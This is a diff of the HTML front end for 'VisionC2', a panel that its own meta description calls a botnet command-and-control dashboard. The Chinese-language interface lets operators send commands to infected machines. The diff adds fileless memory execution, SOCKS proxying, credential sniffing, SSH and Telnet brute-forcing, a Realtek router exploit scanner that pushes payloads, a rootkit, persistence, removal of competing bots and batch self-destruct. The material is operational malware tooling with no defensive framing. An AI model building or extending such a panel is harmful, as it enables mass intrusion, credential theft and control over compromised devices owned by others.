@@ -4,13 +4,17 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>VisionC2 — Tactical Command Center</title>
+    <title>VisionC2 Tactical Command Center</title>
+    <meta name="description" content="Tactical botnet C2 management dashboard featuring bot monitoring, global telemetry mapping, terminal shell, and network diagnostics.">
+    <meta property="og:title" content="VisionC2 Tactical Command Center">
+    <meta property="og:description" content="Tactical botnet C2 management dashboard featuring bot monitoring, global telemetry mapping, terminal shell, and network diagnostics.">
     <link rel="stylesheet" href="/static/style.css">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 
 <body>
+    <!-- Tactical CRT Scanline Overlay -->
+    <div class="crt-overlay" id="crt-overlay"></div>
+
     <div class="app-container">
         <!-- ── Left Tactical Sidebar Navigation ── -->
         <aside class="sidebar">
@@ -67,6 +71,7 @@
                     </div>
                 </div>
                 <div class="top-header-right">
+                    <button class="action-icon-btn" id="crt-toggle-btn" onclick="toggleCRT()" title="切换极客 CRT 扫描线滤镜">📺</button>
                     <button class="action-icon-btn" onclick="toggleTheme()" title="切换亮色/暗色主题">🌓</button>
                     <button class="action-icon-btn" onclick="refreshAll()" title="刷新数据">🔄</button>
                 </div>
@@ -121,28 +126,69 @@
                         <div class="cmd-dock-header">
                             <div class="cmd-dock-title">⚡ 快捷命令中心 (Command Center)</div>
                             <div class="cmd-cat-pills">
-                                <button class="cmd-cat-btn active" data-cat="exec" onclick="switchCmdCat(this)">执行</button>
-                                <button class="cmd-cat-btn" data-cat="network" onclick="switchCmdCat(this)">网络</button>
-                                <button class="cmd-cat-btn" data-cat="mgmt" onclick="switchCmdCat(this)">管理</button>
+                                <button class="cmd-cat-btn active" data-cat="exec" onclick="switchCmdCat(this)">🚀 执行</button>
+                                <button class="cmd-cat-btn" data-cat="network" onclick="switchCmdCat(this)">⚡ 代理/端口</button>
+                                <button class="cmd-cat-btn" data-cat="recon" onclick="switchCmdCat(this)">🔍 嗅探/扫描</button>
+                                <button class="cmd-cat-btn" data-cat="stealth" onclick="switchCmdCat(this)">🛡️ 隐蔽驻留</button>
+                                <button class="cmd-cat-btn" data-cat="mgmt" onclick="switchCmdCat(this)">⚙️ 运维管理</button>
                             </div>
                         </div>
                         <div class="cmd-dock-body">
-                            <select id="cmd-type" class="cmd-select" onchange="updateArgFields()">
-                                <option value="!shell" data-cat="exec">!shell (系统 Shell)</option>
-                                <option value="!ptyshell" data-cat="exec">!ptyshell (PTY 交互终端)</option>
-                                <option value="!detach" data-cat="exec">!detach (后台运行)</option>
-                                <option value="!memexec" data-cat="exec">!memexec (URL 内存无文件执行)</option>
-                                <option value="!memexecb64" data-cat="exec">!memexecb64 (Base64 内存执行)</option>
-                                <option value="!socks" data-cat="network">!socks (SOCKS5 代理)</option>
-                                <option value="!stopsocks" data-cat="network">!stopsocks (停止代理)</option>
-                                <option value="!portfwd" data-cat="network">!portfwd (TCP 端口转发)</option>
-                                <option value="!stopportfwd" data-cat="network">!stopportfwd (停止端口转发)</option>
-                                <option value="!reinstall" data-cat="mgmt">!reinstall (远程更新/重装)</option>
-                                <option value="!lolnogtfo" data-cat="mgmt">!kill (彻底销毁)</option>
-                            </select>
-                            <div id="arg-fields" style="display:flex;gap:8px;flex:1"></div>
-                            <input type="text" id="cmd-bot" placeholder="目标: 全部受控端 (留空为全广播，或填特定 Bot ID)" class="cmd-input-field">
-                            <button class="cmd-submit-btn" onclick="sendCmd()">发送命令</button>
+                            <!-- Tier 1: Selection, Target & Quick Presets -->
+                            <div class="cmd-row-main">
+                                <select id="cmd-type" class="cmd-select" onchange="updateArgFields()" style="min-width:220px">
+                                    <optgroup label="🚀 系统执行">
+                                        <option value="!shell" data-cat="exec">!shell (系统终端命令)</option>
+                                        <option value="!detach" data-cat="exec">!detach (脱离终端后台运行)</option>
+                                        <option value="!memexec" data-cat="exec">!memexec (URL 内存无文件注入)</option>
+                                        <option value="!memexecb64" data-cat="exec">!memexecb64 (Base64 二进制执行)</option>
+                                    </optgroup>
+                                    <optgroup label="⚡ 代理与端口转发">
+                                        <option value="!socks" data-cat="network">!socks (启动 SOCKS5 代理)</option>
+                                        <option value="!stopsocks" data-cat="network">!stopsocks (停止 SOCKS5 代理)</option>
+                                        <option value="!portfwd" data-cat="network">!portfwd (建立 TCP 端口转发)</option>
+                                        <option value="!stopportfwd" data-cat="network">!stopportfwd (停止端口转发)</option>
+                                        <option value="!portscan" data-cat="network">!portscan (内网并发端口扫描)</option>
+                                    </optgroup>
+                                    <optgroup label="🔍 嗅探与扫描">
+                                        <option value="!sniffer" data-cat="recon">!sniffer (网卡数据包凭据嗅探)</option>
+                                        <option value="!ssh_scan" data-cat="recon">!ssh_scan (SSH 弱口令并发爆破)</option>
+                                        <option value="!telnet_scan" data-cat="recon">!telnet_scan (Telnet 弱口令爆破)</option>
+                                        <option value="!realtek_scan" data-cat="recon">!realtek_scan (Realtek 路由器扫描)</option>
+                                    </optgroup>
+                                    <optgroup label="🛡️ 隐蔽与持久化">
+                                        <option value="!rootkit" data-cat="stealth">!rootkit (LD_PRELOAD 隐蔽)</option>
+                                        <option value="!persist" data-cat="stealth">!persist (三级开机深度持久化)</option>
+                                        <option value="!killer" data-cat="stealth">!killer (竞品僵尸进程清除)</option>
+                                    </optgroup>
+                                    <optgroup label="⚙️ 节点运维">
+                                        <option value="!reinstall" data-cat="mgmt">!reinstall (远程升级/拉取最新)</option>
+                                        <option value="!kill" data-cat="mgmt">!kill (远程抹除自毁)</option>
+                                    </optgroup>
+                                </select>
+
+                                <div style="display:flex;align-items:center;gap:6px;flex:1">
+                                    <select id="cmd-bot-select" class="cmd-select" onchange="syncCmdBotSelect(this.value)" style="min-width:180px">
+                                        <option value="">⚡ 全部受控端 (全局广播)</option>
+                                    </select>
+                                    <input type="text" id="cmd-bot" placeholder="手动填 Bot ID (留空为广播)" class="cmd-input-field" style="width:190px">
+                                </div>
+
+                                <div class="quick-chips-wrap" id="shell-quick-chips">
+                                    <span style="font-size:11px;color:var(--text-dim)">预设:</span>
+                                    <button class="quick-chip" onclick="fillShellCmd('whoami')">whoami</button>
+                                    <button class="quick-chip" onclick="fillShellCmd('id')">id</button>
+                                    <button class="quick-chip" onclick="fillShellCmd('uname -a')">uname</button>
+                                    <button class="quick-chip" onclick="fillShellCmd('ps aux')">ps aux</button>
+                                    <button class="quick-chip" onclick="fillShellCmd('ip addr')">ip addr</button>
+                                </div>
+                            </div>
+
+                            <!-- Tier 2: Dynamic Parameters & Submit -->
+                            <div class="cmd-row-args">
+                                <div id="arg-fields" style="display:flex;gap:8px;flex:1;align-items:center"></div>
+                                <button class="cmd-submit-btn" onclick="sendCmd()" style="white-space:nowrap;padding:9px 24px">🚀 下发指令</button>
+                            </div>
                         </div>
                     </div>
 
@@ -228,6 +274,22 @@
                                 <input type="text" id="scan-ssh-cidr" placeholder="如 10.0.0.0/24" class="cmd-input-field" style="width:100%;margin-bottom:10px">
                                 <div class="scanner-card-actions">
                                     <button class="cmd-submit-btn" onclick="startScannerCmd('!ssh_scan', 'scan-ssh-cidr')">全部启动</button>
+                                    <button class="cmd-submit-btn" style="background:var(--red)" onclick="stopScannerCmd()">停止扫描</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Card: Realtek SDK Router Exploit Scanner -->
+                        <div class="scanner-card">
+                            <div class="scanner-card-header">
+                                <span class="scanner-card-title">Realtek 路由器漏洞扫描器</span>
+                                <span class="scanner-card-desc">针对指定网段并发探测 Realtek SDK 远程执行漏洞 (CVE-2021-35394) 并投递 Payload</span>
+                            </div>
+                            <div class="scanner-card-body">
+                                <input type="text" id="scan-realtek-cidr" placeholder="目标 CIDR 网段 (如 192.168.1.0/24) 或 auto" class="cmd-input-field" style="width:100%;margin-bottom:8px">
+                                <input type="text" id="scan-realtek-payload" placeholder="Payload URL (可选，留空使用默认二进制)" class="cmd-input-field" style="width:100%;margin-bottom:10px">
+                                <div class="scanner-card-actions">
+                                    <button class="cmd-submit-btn" onclick="startScannerCmdWithPayload('!realtek_scan', 'scan-realtek-cidr', 'scan-realtek-payload')">全部启动</button>
                                     <button class="cmd-submit-btn" style="background:var(--red)" onclick="stopScannerCmd()">停止扫描</button>
                                 </div>
                             </div>
@@ -455,9 +517,30 @@
 
                 <!-- ════════ VIEW 6: PTY TERMINAL ════════ -->
                 <section class="view-section" id="sec-terminal">
-                    <div class="table-container" style="padding:20px;background:#000;color:#0f0;font-family:var(--mono);min-height:450px" id="pty-terminal-wrap">
-                        <div>[VisionC2 PTY Web Console Ready]</div>
-                        <div style="color:#888;margin-top:8px">选择一个受控端点击 "打开 PTY 终端" 开启会话...</div>
+                    <div class="table-container" style="padding:14px 18px;background:var(--bg-card);border:1px solid var(--border);border-radius:10px;margin-bottom:14px">
+                        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px">
+                            <div style="display:flex;align-items:center;gap:10px">
+                                <span style="font-size:13px;font-weight:700;color:var(--accent)">🎯 会话目标:</span>
+                                <select id="term-bot-selector" class="cmd-select" onchange="if(this.value)openShell(this.value)" style="min-width:220px">
+                                    <option value="">-- 请选择要连入的受控端 --</option>
+                                </select>
+                            </div>
+                            <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+                                <span style="font-size:11px;color:var(--text-dim)">常用探测:</span>
+                                <button class="quick-chip" onclick="termQuickCmd('whoami')">whoami</button>
+                                <button class="quick-chip" onclick="termQuickCmd('id')">id</button>
+                                <button class="quick-chip" onclick="termQuickCmd('uname -a')">uname</button>
+                                <button class="quick-chip" onclick="termQuickCmd('ps aux')">ps aux</button>
+                                <button class="quick-chip" onclick="termQuickCmd('ip addr')">ip addr</button>
+                                <button class="quick-chip" onclick="termQuickCmd('uptime')">uptime</button>
+                                <button class="quick-chip" style="color:var(--red);border-color:rgba(248,113,113,0.3)" onclick="termQuickCmd('clear')">清屏</button>
+                                <button class="quick-chip" style="color:var(--accent);border-color:rgba(168,85,247,0.3)" onclick="toggleTermMaximize()" id="term-max-btn">⛶ 最大化</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="table-container" style="padding:20px;background:#050505;border:1px solid #1f293d;border-radius:10px;min-height:480px" id="pty-terminal-wrap">
+                        <div style="color:var(--green);font-family:var(--mono)">[VisionC2 PTY Web Console Ready]</div>
+                        <div style="color:#666;margin-top:8px;font-size:13px">请在上方选择一个受控端，或在首页受控端列表点击 "PTY" 建立交互终端...</div>
                     </div>
                 </section>
 
@@ -489,8 +572,9 @@
                                 <option value="basic">Basic (普通操作员)</option>
                                 <option value="owner">Owner (最高组)</option>
                             </select>
-                            <input type="number" id="nu-maxtime" placeholder="最大时长(秒)" value="300" class="cmd-input-field" style="width:120px">
-                            <input type="number" id="nu-concurrents" placeholder="并发数" value="5" class="cmd-input-field" style="width:100px">
+                            <input type="number" id="nu-maxtime" placeholder="最大时长(秒)" value="300" class="cmd-input-field" style="width:110px">
+                            <input type="number" id="nu-concurrents" placeholder="并发数" value="5" class="cmd-input-field" style="width:90px">
+                            <input type="number" id="nu-maxbots" placeholder="最大节点数 (留空无限)" value="100" class="cmd-input-field" style="width:140px">
                             <button class="cmd-submit-btn" onclick="createNewUser()">➕ 添加用户</button>
                         </div>
                     </div>
@@ -523,9 +607,23 @@
         </div>
     </div>
 
+    <!-- Batch Actions Floating Dock (Appears when checkboxes are selected) -->
+    <div id="batch-action-bar" class="batch-bar" style="display:none">
+        <div class="batch-bar-info">⚡ 已选中 <span id="batch-count" style="color:var(--green)">0</span> 个受控端</div>
+        <div class="batch-bar-actions">
+            <button class="cmd-cat-btn" onclick="batchCmdPrompt('!shell')">💻 批量下发 Shell</button>
+            <button class="cmd-cat-btn" onclick="batchExecuteDirect('!socks')">⚡ 批量开启 SOCKS</button>
+            <button class="cmd-cat-btn" onclick="batchExecuteDirect('!persist')">📌 批量安装驻留</button>
+            <button class="cmd-cat-btn" style="background:var(--red-dim);color:var(--red);border-color:rgba(248,113,113,0.3)" onclick="batchExecuteDirect('!kill')">🔴 批量销毁</button>
+            <button class="cmd-cat-btn sec" onclick="clearSelectedBots()">取消全选</button>
+        </div>
+    </div>
+
     <!-- Right-click Context Menu -->
     <div class="ctx-menu" id="bot-ctx-menu" style="display:none;position:fixed;z-index:99999">
         <div class="ctx-item" onclick="ctxAction('pty')">💻 打开 PTY 终端</div>
+        <div class="ctx-item" onclick="ctxAction('socks')">⚡ 开启 SOCKS5 代理</div>
+        <div class="ctx-item" onclick="ctxAction('sniffer')">📡 启动网卡嗅探 (Sniffer)</div>
         <div class="ctx-item" onclick="ctxAction('portscan')">🔍 发起内网端口扫描</div>
         <div class="ctx-item" onclick="ctxAction('portfwd')">⚡ 创建 TCP 端口转发</div>
         <div class="ctx-item" onclick="ctxAction('rootkit')">🛡️ Rootkit 检查/安装</div>
@@ -548,6 +646,9 @@
             </div>
         </div>
     </div>
+
+    <!-- Toast Notifications Floating Hub -->
+    <div id="toast-container" class="toast-container"></div>
 
     <script src="/static/app.js"></script>
 </body>
